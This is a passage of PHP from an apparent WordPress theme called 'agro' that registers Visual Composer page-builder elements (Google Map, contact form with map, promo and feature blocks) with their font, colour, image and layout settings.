                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* google map
/******************************/
if (!function_exists('agro_gmap_integrateWithVC')) {
    add_action('vc_before_init', 'agro_gmap_integrateWithVC');
    function agro_gmap_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Google Map', 'agro'),
        'base' => 'agro_gmap',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'checkbox',
                'param_name' => 'useiframe',
                'heading' => esc_html__('Use custom iframe map?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'iframemap',
                'heading' => esc_html__('Add iframe src here', 'agro'),
                'description' => sprintf(esc_html__('Visit %s to create your map (Step by step: 1) Find location 2) Click the cog symbol in the lower right corner and select "Share or embed map" 3) On modal window select "Embed map" 4) Copy iframe src code and paste it).', 'agro'),'<a href="https://www.google.com/maps" target="_blank">Google maps</a>'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'markerimg',
                'heading' => esc_html__('Map Marker Image - Please use maximum 70px image', 'agro'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'apikey',
                'heading' => esc_html__('Api Key', 'agro'),
                'description' => esc_html__('This is demo key e.g: AIzaSyBXQROV5YMCERGIIuwxrmaZbBl_Wm4Dy5U', 'agro'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'longitude',
                'heading' => esc_html__('Longitude Coordinate', 'agro'),
                'description' => esc_html__('This is demo longitude e.g: 44.958309', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'latitude',
                'heading' => esc_html__('Latitude Coordinate', 'agro'),
                'description' => esc_html__('This is demo latitude e.g: 34.109925', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'zoom',
                'heading' => esc_html__('Zoom', 'agro'),
                'description' => esc_html__('This is option zoom setting', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'minh',
                'heading' => esc_html__('Min Map Height', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* google map & contact form
/******************************/
if (!function_exists('agro_contactgmap_integrateWithVC')) {
    add_action('vc_before_init', 'agro_contactgmap_integrateWithVC');
    function agro_contactgmap_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Contact Form & GMap', 'agro'),
        'base' => 'agro_contactgmap',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Contact Form Title', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Contact Form Thin Title', 'agro'),
            ),
            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Contact Form 7 Shortcode Area', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'useiframe',
                'heading' => esc_html__('Use custom iframe map?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'iframemap',
                'heading' => esc_html__('Add iframe src here', 'agro'),
                'description' => sprintf(esc_html__('Visit %s to create your map (Step by step: 1) Find location 2) Click the cog symbol in the lower right corner and select "Share or embed map" 3) On modal window select "Embed map" 4) Copy iframe src code and paste it).', 'agro'),'<a href="https://www.google.com/maps" target="_blank">Google maps</a>'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'markerimg',
                'heading' => esc_html__('Map Marker Image', 'agro'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'apikey',
                'heading' => esc_html__('Api Key', 'agro'),
                'description' => esc_html__('This is demo key e.g: AIzaSyBXQROV5YMCERGIIuwxrmaZbBl_Wm4Dy5U', 'agro'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'longitude',
                'heading' => esc_html__('Longitude Coordinate', 'agro'),
                'description' => esc_html__('This is demo longitude e.g: 44.958309', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'latitude',
                'heading' => esc_html__('Latitude Coordinate', 'agro'),
                'description' => esc_html__('This is demo latitude e.g: 34.109925', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'minh',
                'heading' => esc_html__('Min Map Height', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}

/*******************************/
/* google map & contact form 2
/******************************/
if (!function_exists('agro_contactgmap2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_contactgmap2_integrateWithVC');
    function agro_contactgmap2_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Contact Form & GMap 2', 'agro'),
        'base' => 'agro_contactgmap2',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Contact Form Title', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'thintitle',
                'heading' => esc_html__('Contact Form Thin Title', 'agro'),
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'desc',
                'heading' => esc_html__('Contact Form Description', 'agro'),
            ),
            array(
                'type' => 'textarea_html',
                'param_name' => 'content',
                'heading' => esc_html__('Contact Form 7 Shortcode Area', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'useiframe',
                'heading' => esc_html__('Use custom iframe map?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'textarea',
                'param_name' => 'iframemap',
                'heading' => esc_html__('Add iframe src here', 'agro'),
                'description' => sprintf(esc_html__('Visit %s to create your map (Step by step: 1) Find location 2) Click the cog symbol in the lower right corner and select "Share or embed map" 3) On modal window select "Embed map" 4) Copy iframe src code and paste it).', 'agro'),'<a href="https://www.google.com/maps" target="_blank">Google maps</a>'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'markerimg',
                'heading' => esc_html__('Map Marker Image', 'agro'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'apikey',
                'heading' => esc_html__('Api Key', 'agro'),
                'description' => esc_html__('This is demo key e.g: AIzaSyBXQROV5YMCERGIIuwxrmaZbBl_Wm4Dy5U', 'agro'),
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'longitude',
                'heading' => esc_html__('Longitude Coordinate', 'agro'),
                'description' => esc_html__('This is demo longitude e.g: 44.958309', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'latitude',
                'heading' => esc_html__('Latitude Coordinate', 'agro'),
                'description' => esc_html__('This is demo latitude e.g: 34.109925', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
                'dependency' => array(
                    'element' => 'useiframe',
                    'is_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'minh',
                'heading' => esc_html__('Min Map Height', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'nt_spacer',
                'param_name' => 'sec_spacer',
                'heading' => esc_html__('Section Text Customize', 'agro'),
                'group' => esc_html__('Color', 'agro')
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'thclr',
                'heading' => esc_html__('Thin title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'descclr',
                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* promo2
/******************************/
if (!function_exists('agro_promo2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_promo2_integrateWithVC');
    function agro_promo2_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Promo 2', 'agro'),
        'base' => 'agro_promo2',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'attach_image',
                'param_name' => 'img1',
                'heading' => esc_html__('Left Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title1',
                'heading' => esc_html__('Image Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-8',
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link1',
                'heading' => esc_html__('Add link to image', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw1',
                'heading' => esc_html__('Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh1',
                'heading' => esc_html__('Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'img2',
                'heading' => esc_html__('Left Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title2',
                'heading' => esc_html__('Image Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-8',
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link2',
                'heading' => esc_html__('Add link to image', 'agro'),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgw2',
                'heading' => esc_html__('Image Width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'imgh2',
                'heading' => esc_html__('Image Height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            // color
            array(
                'type' => 'colorpicker',
                'param_name' => 'brdclr',
                'heading' => esc_html__('First item border color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('First title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15'
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr2',
                'heading' => esc_html__('Second title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* features_one item
/******************************/
if (!function_exists('agro_features_one_integrateWithVC')) {
    add_action('vc_before_init', 'agro_features_one_integrateWithVC');
    function agro_features_one_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Features Item', 'agro'),
        'base' => 'agro_features_one',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'attach_image',
                'param_name' => 'img',
                'heading' => esc_html__('Item image', 'agro')
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'title',
                'heading' => esc_html__('Item title', 'agro')
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Add link to item', 'agro'),
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'anim',
                'heading' => esc_html__('Add animation?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' )
            ),
            array(
                'type' => 'dropdown',
                'param_name' => 'aos',
                'heading' => esc_html__('Animation', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'value' => bon_anim_aos(),
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                ),
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'delay',
                'heading' => esc_html__('Animation delay', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'offset',
                'heading' => esc_html__('Animation offset', 'agro'),
                'edit_field_class' => 'vc_col-sm-4',
                'dependency' => array(
                    'element' => 'anim',
                    'not_empty' => true
                )
            ),
            // fonts
            array(
                'type' => 'nt_spacer',
                'param_name' => 'fonts_spacer',
                'heading' => esc_html__('Heading Fonts Customize', 'agro'),
                'group' => esc_html__('Fonts', 'agro')
            ),
            array(
                'type' => 'checkbox',
                'param_name' => 'usefonts',
                'heading' => esc_html__('Use Google Fonts?', 'agro'),
                'value' => array( esc_html__('Yes', 'agro') => 'yes' ),
                'description' => esc_html__('If checked, the section background image will be disabled on max 992px.', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
            ),
            array(
                'type' => 'dropdown',
                'heading' => esc_html__('Heading tag', 'agro'),
                'param_name' => 'htag',
                'group' => esc_html__('Fonts', 'agro'),
                'value' => array(
                    esc_html__('Select tag', 'agro') => '',
                    esc_html__('h1', 'agro') => 'h1',
                    esc_html__('h2', 'agro') => 'h2',
                    esc_html__('h3', 'agro') => 'h3',
                    esc_html__('h4', 'agro') => 'h4',
                    esc_html__('h5', 'agro') => 'h5',
                    esc_html__('h6', 'agro') => 'h6',
                    esc_html__('div', 'agro') => 'div',
                    esc_html__('p', 'agro') => 'p',
                    esc_html__('span', 'agro') => 'span'
                )
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'tsize',
                'heading' => esc_html__('Font size', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lheight',
                'heading' => esc_html__('Line height', 'agro'),
                'group' => esc_html__('Fonts', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            array(
                'type' => 'google_fonts',
                'param_name' => 'google_fonts',
                'value' => 'font_family:Abril%20Fatface%3Aregular|font_style:400%20regular%3A400%3Anormal',
                'group' => esc_html__('Fonts', 'agro'),
                'settings' => array(
                    'fields' => array(
                        'font_family_description' => esc_html__( 'Select font family.', 'agro' ),
                        'font_style_description' => esc_html__( 'Select font styling.', 'agro' )
                    )
                ),
                'dependency' => array(
                    'element' => 'usefonts',
                    'not_empty' => true
                )
            ),
            array(
                'type' => 'colorpicker',
                'param_name' => 'tclr',
                'heading' => esc_html__('Title color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}


/*******************************/
/* features style 2
/******************************/
if (!function_exists('agro_features2_integrateWithVC')) {
    add_action('vc_before_init', 'agro_features2_integrateWithVC');
    function agro_features2_integrateWithVC()
    {
        vc_map(array(
        'name' => esc_html__('Features 2', 'agro'),
        'base' => 'agro_features2',
        'icon' => 'nt_logo',
        'category' => 'AGRO',
        'params' => array(
            array(
                'type' => 'attach_image',
                'param_name' => 'lgimg',
                'heading' => esc_html__('Logo', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgimgw',
                'heading' => esc_html__('Logo width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'lgimgh',
                'heading' => esc_html__('Logo height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'attach_image',
                'param_name' => 'bgimg',
                'heading' => esc_html__('Background Image', 'agro'),
                'edit_field_class' => 'vc_col-sm-4 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgw',
                'heading' => esc_html__('Background Image width', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'bgimgh',
                'heading' => esc_html__('Background Image height', 'agro'),
                'description' => esc_html__('Use simple number without ( px or unit) for auto-crop image.', 'agro'),
                'edit_field_class' => 'vc_col-sm-4'
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'stitle',
                'heading' => esc_html__('Section Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6 pt15',
            ),
            array(
                'type' => 'textfield',
                'param_name' => 'sthintitle',
                'heading' => esc_html__('Section Thin Title', 'agro'),
                'edit_field_class' => 'vc_col-sm-6',
            ),
            array(
                'type' => 'vc_link',
                'param_name' => 'link',
                'heading' => esc_html__('Section Button', 'agro'),
            ),
            array(
                'type' => 'param_group',
                'param_name' => 'loop',
                'heading' => esc_html__('Create Features', 'agro'),
                'group' => esc_html__('Features', 'agro'),
                'params' => array(
                    array(
                        'type' => 'attach_image',
                        'param_name' => 'img',
                        'heading' => esc_html__('Item image', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'textfield',
                        'param_name' => 'title',
                        'heading' => esc_html__('Item title', 'agro'),
                        'edit_field_class' => 'vc_col-sm-6',
                    ),
                    array(
                        'type' => 'dropdown',
                        'heading' => esc_html__('SM Column Width', 'agro'),
                        'description' => esc_html__('SM : Small Device', 'agro'),
                        'param_name' => 'sm',
                        'edit_field_class' => 'vc_col-sm-6',
                        'value' => array(
                            esc_html__('Select a option', 'agro') => '',
                            esc_html__('1 column', 'agro') => 'col-sm-1',
                            esc_html__('2 column', 'agro') => 'col-sm-2',
                            esc_html__('3 column', 'agro') => 'col-sm-3',
                            esc_html__('4 column', 'agro') => 'col-sm-4',
                            esc_html__('5 column', 'agro') => 'col-sm-5',
                            esc_html__('6 column', 'agro') => 'col-sm-6',
                            esc_html__('7 column', 'agro') => 'col-sm-7',
                            esc_html__('8 column', 'agro') => 'col-sm-8',
                            esc_html__('9 column', 'agro') => 'col-sm-9',
                            esc_html__('10 column', 'agro') => 'col-sm-10',
                            esc_html__('11 column', 'agro') => 'col-sm-11',
